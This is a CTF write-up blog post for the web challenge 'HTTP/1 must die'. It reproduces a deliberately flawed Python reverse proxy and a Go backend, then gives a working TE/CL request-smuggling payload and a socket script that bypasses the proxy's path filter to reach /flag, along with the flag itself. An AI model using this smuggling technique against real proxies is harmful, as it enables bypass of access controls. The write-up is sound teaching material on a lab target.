---
layout: post
title:  "HTTP/1 must die"
date:   2025-11-16 23:06:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /platypwn-http-1-must-die/
---

**Title**: HTTP/1 must die

**Category**: Web

**Description**: I had some free time and started building a little reverse proxy in python, just for the fun of it. But man HTTP/1 is weird. Anyway, I think my proxy mostly works and it allowed me to skip implementing authentication on my server cause I can just block routes there. Pretty cool, no?

The challenge name reminded me of this research by James Kettle: [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die) 

I get the challenge files. There are 2 servers. A python based HTTP/1.1 reverse proxy which forwards requests to a Go backend server, but blocks any path containing "flag". The backend serves a static message at `/` and the flag at `/flag`. To get the flag I must exploit an HTTP request smuggling vulnerability

Here is the code for the python server `proxy.py`:
```shell
import asyncio  
from urllib.parse import unquote  
import os  
  
PROXY_ADDR = "0.0.0.0"  
PROXY_PORT = "8000"  
BACKEND_ADDR = os.getenv("SERVER_SERVICE_HOST", "server") # Kubernetes service shenanigans  
BACKEND_PORT = "9000"  
  
READ_TIMEOUT = 5.0  
  
async def send_error(error_message, client_writer):  
 try:  
   client_writer.write(error_message)  
   await client_writer.drain()  
 except Exception as e:  
   print("[send_error] write/drain failed: ", e)  
 try:  
   client_writer.close()  
   await client_writer.wait_closed()  
 except Exception:  
   pass  
  
async def handle_length(client_reader, num_bytes, timeout=READ_TIMEOUT):  
 try:  
   body = await asyncio.wait_for(client_reader.readexactly(num_bytes), timeout=timeout)  
   return body  
 except Exception as e:  
   print(e)  
   return None  
  
async def handle_chunked(client_reader, timeout=READ_TIMEOUT):  
 out = bytearray()  
 try:  
   while True:  
     size_line = await asyncio.wait_for(client_reader.readline(), timeout=timeout)  
     if not size_line:  
       return None  
     out += size_line  
  
     size_str = size_line.strip().split(b";", 1)[0] # don't care about chunk extensions  
     try:  
       size = int(size_str, 16)  
     except Exception:  
       print("[handle_chunked] bad size line:", size_line[:200])  
       return None  
  
     if size < 0:  
       print("[handle_chunked] chunk size out of bounds:", size)  
       return None  
  
     if size == 0:  
       trailing_crlf = await asyncio.wait_for(client_reader.readexactly(2), timeout=timeout)  
       out += trailing_crlf  
       break  
    
     chunk = await asyncio.wait_for(client_reader.readexactly(size + 2), timeout=timeout)  
     out += chunk  
      
   return bytes(out)  
 except asyncio.TimeoutError:  
   print("[handle_chunked] timeout")  
   return None  
 except Exception as e:  
   print("[handle_chunked] ex:", e)  
   return None  
  
def parse_headers(header_bytes):  
 header_text = header_bytes.decode("iso-8859-1")  
 lines = header_text.split("\r\n")  
 start = lines[0]  
 headers = {}  
 for line in lines[1:]:  
   if not line or ":" not in line:  
     continue  
   key, value = line.split(":", 1)  
   headers[key.strip().lower()] = value.strip()  
 return start, headers  
  
def build_forward_headers(start, header_map):  
 connection_tokens = []  
 if "connection" in header_map:  
   connection_tokens = [  
     token.strip().lower()  
     for token in header_map["connection"].split(",")  
     if token.strip()  
   ]  
 hop_by_hop = {  
   "connection",  
   "keep-alive",  
   "proxy-connection",  
   "transfer-encoding",  
   "te",  
   "trailer",  
   "upgrade",  
 }  
 hop_by_hop.update(connection_tokens)  
  
 header_lines = [start]  
 for key, value in header_map.items():  
   if key in hop_by_hop:  
     continue  
   header_lines.append(f"{key}: {value}")  
 header_block = ("\r\n".join(header_lines) + "\r\n\r\n").encode("iso-8859-1")  
 return header_block  
  
async def deliver_responses(backend_reader, client_writer):  
 try:  
   while True:  
     try:  
       answer_headers = await backend_reader.readuntil(b"\r\n\r\n")  
     except asyncio.IncompleteReadError:  
       # backend closed connection  
       break  
     except Exception as e:  
       print("[deliver_responses] header read error:", e)  
       break  
  
     _, header_map = parse_headers(answer_headers)  
     cl = header_map.get("content-length")  
     te = header_map.get("transfer-encoding")  
  
     if te and "chunked" in te.lower():  
       client_writer.write(answer_headers)  
       await client_writer.drain()  
       body = await handle_chunked(backend_reader)  
       if body is None:  
         print("[deliver_responses] chunked body read failed")  
         break  
       client_writer.write(body)  
       await client_writer.drain()  
     elif cl is not None:  
       try:  
         n = int(cl)  
       except Exception:  
         print("[deliver_responses] invalid Content-Length:", cl)  
         break  
       try:  
         body = await backend_reader.readexactly(n)  
       except Exception as e:  
         print("[deliver_responses] readexactly failed:", e)  
         break  
       client_writer.write(answer_headers + body)  
       await client_writer.drain()  
     else:  
       # no CL and not chunked -> read until backend closes and forward  
       client_writer.write(answer_headers)  
       await client_writer.drain()  
       while True:  
         chunk = await backend_reader.read(4096)  
         if not chunk:  
           break  
         client_writer.write(chunk)  
         await client_writer.drain()  
 except Exception as e:  
   print("[deliver_responses] outer exception:", e)  
  
async def handle_client(client_reader, client_writer):  
 deliver_task = None  
 backend_writer = None  
 try:  
   try:  
     backend_reader, backend_writer = await asyncio.open_connection(BACKEND_ADDR, BACKEND_PORT)  
   except Exception as e:  
     print("Could not open connection to backend: ", e)  
     await send_error(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 78\r\nConnection: close\r\n\r\nBad Gateway. This should not happen. Please open a ticket with the organize  
rs.", client_writer)  
     return  
      
   deliver_task = asyncio.create_task(deliver_responses(backend_reader, client_writer))  
  
   def _task_done(t):  
     try:  
       exc = t.exception()  
       if exc:  
         print("[deliver_responses] task finished with exception:", repr(exc))  
     except asyncio.CancelledError:  
       pass  
  
   deliver_task.add_done_callback(_task_done)  
  
   while True:  
     try:  
       headers = await asyncio.wait_for(client_reader.readuntil(b"\r\n\r\n"), timeout=READ_TIMEOUT)  
     except Exception as e:  
       print("[Header Read Error] ", e)  
       return  
        
     if not headers:  
       await send_error(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 15\r\nConnection: close\r\n\r\nMissing Headers", client_writer)  
       return  
        
     start, header_map = parse_headers(headers)  
     try:  
       method, target, _ = start.split(" ", 2)  
     except Exception:  
       await send_error(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 22\r\nConnection: close\r\n\r\nBroken first HTTP line", client_writer)  
       return  
  
     if "flag" in unquote(target.lower()):  
       # don't you dare go after my precioussss  
       await send_error(b"HTTP/1.1 403 Forbidden\r\nContent-Length: 19\r\nConnection: close\r\n\r\nMy flag, not yours!", client_writer)  
       return  
        
     if method == "GET":  
       try:  
         backend_writer.write(headers)  
         await backend_writer.drain()  
       except Exception as e:  
         print("[handle_client] write to backend failed: ", e)  
         break  
  
     else:  
       if "transfer-encoding" in header_map:  
         body = await handle_chunked(client_reader)  
       elif "content-length" in header_map:  
         length_val = header_map.get("content-length")  
         try:  
             num = int(length_val)  
         except Exception:  
             await send_error(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 10\r\nConnection: close\r\n\r\nBad Length", client_writer)  
             break  
         body = await handle_length(client_reader, num)  
       else:  
         # How did we get here?  
         await send_error(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 96\r\nConnection: close\r\n\r\nYou unlocked a hidden achievement! Why though? well you tell me. It def  
initely doesn't help you.", client_writer)  
         return  
  
       if body is None:  
         await send_error(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 16\r\nConnection: close\r\n\r\nBody read failed", client_writer)  
         break  
  
       forward_headers = build_forward_headers(start, header_map)  
       try:  
         backend_writer.write(forward_headers + body)  
         await backend_writer.drain()  
       except Exception as e:  
         print("[handle_client] backend write failed:", e)  
         break  
  
 except Exception as e:  
   print(f"Outer Exception: {e}")  
 finally:  
   if deliver_task:  
     deliver_task.cancel()  
     try:  
       await deliver_task  
     except Exception:  
       pass  
   if backend_writer:  
     try:  
       backend_writer.close()  
       await backend_writer.wait_closed()  
     except Exception:  
       pass  
   try:  
     client_writer.close()  
     await client_writer.wait_closed()  
   except Exception:  
     pass  
  
async def main():  
 server = await asyncio.start_server(handle_client, PROXY_ADDR, PROXY_PORT)  
 async with server:  
   await server.serve_forever()  
  
if __name__ == "__main__":  
 asyncio.run(main())
```

go backend server `server.go`:
```shell
package main  
  
import (  
       "fmt"  
       "log"  
       "net/http"  
       "os"  
)  
  
func main() {  
       flagValue, ok := os.LookupEnv("FLAG")  
       if !ok || flagValue == "" {  
               log.Fatalf("required environment variable FLAG is not set")  
       }  
  
       http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {  
               fmt.Fprintln(w, "You cannot pass. I am a servant of the secret fire, wielder of the flame of Anor. Your dark magic will not avail you, flame of Udûn. This flag  
stands under my protection! You cannot pass.")  
       })  
  
       http.HandleFunc("/flag", func(w http.ResponseWriter, r *http.Request) {  
               fmt.Fprintln(w, flagValue)  
       })  
  
       addr := "127.0.0.1:9000"  
       log.Printf("Server starting on %s\n", addr)  
       if err := http.ListenAndServe(addr, nil); err != nil {  
               log.Fatalf("server failed: %v", err)  
       }  
}
```

So the python server acts as a reverse proxy listening for incoming HTTP/1.1 requests. It parses the request and checks the path for the word "flag", and if not found, forwards the request to the backend. It removes hop by hop headers before forwarding, but keeps the content length header. 

The backend server is a simple Go HTTP server. It has two endpoints. `/` returns the static `you cannot pass...` message. `/flag` returns the flag value from the environment variable. 

Traffic goes from client > proxy (8000) > backend (9000). 

My request should look like this:
```shell
POST / HTTP/1.1\r\n
Host: 10.80.15.7:8000\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 4\r\n
Connection: keep-alive\r\n

\r\n3a\r\n
GET /flag HTTP/1.1\r\n
Host: localhost\r\n
Content-Length: 7\r\n

\r\n\r\n0\r\n\r\n
```

I run this python script to get the flag:
```python
import socket

request = b"""POST / HTTP/1.1\r\nHost: 10.80.15.7:8000\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n3a\r\nGET /flag HTTP/1.1\r\nHost: localhost\r\nContent-Length: 7\r\n\r\n\r\n0\r\n\r\n"""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.80.15.7', 8000))
s.sendall(request)
response = b''
while True:
    data = s.recv(4096)
    if not data:
        break
    response += data
s.close()
print(response.decode('utf-8', errors='ignore'))
```
The request starts with a `POST` request to `/` so no "flag" string gets the request blocked. `Transfer-Encoding: chunked` tells proxy to parse body as chunks. `Content-Length: 4` is ignored by the proxy for reading, but kept when forwarding.

The proxy sees nothing wrong with the request and forwards it to the backend. The backend sees a `POST` request to `/` with the header `Content-Length: 4`. It reads exactly 4 bytes as the body (which would be `3a\r\n`). Then it processes the `POST` request and responds with its static message.

The remaining bytes in the stream are then `GET /flag HTTP/1.1\r\nHost: localhost\r\nContent-Length: 7\r\n\r\n\r\n0\r\n\r\n`. The backend then treats this as a new pipelined request (`GET /flag with Content-Length: 7`). 

Output:
```shell
python3 solve.py  
HTTP/1.1 200 OK  
Date: Sun, 16 Nov 2025 06:18:13 GMT  
Content-Length: 189  
Content-Type: text/plain; charset=utf-8  
  
You cannot pass. I am a servant of the secret fire, wielder of the flame of Anor. Your dark magic will not avail you, flame of Udûn. This flag stands under my protection! You cannot pass.  
HTTP/1.1 200 OK  
Date: Sun, 16 Nov 2025 06:18:13 GMT  
Content-Length: 50  
Content-Type: text/plain; charset=utf-8  
  
PP{why_4r3_th3r3_2_l3ngth_h34d3rs?::mNfQjgurddP8}
```

`PP{why_4r3_th3r3_2_l3ngth_h34d3rs?::mNfQjgurddP8}`
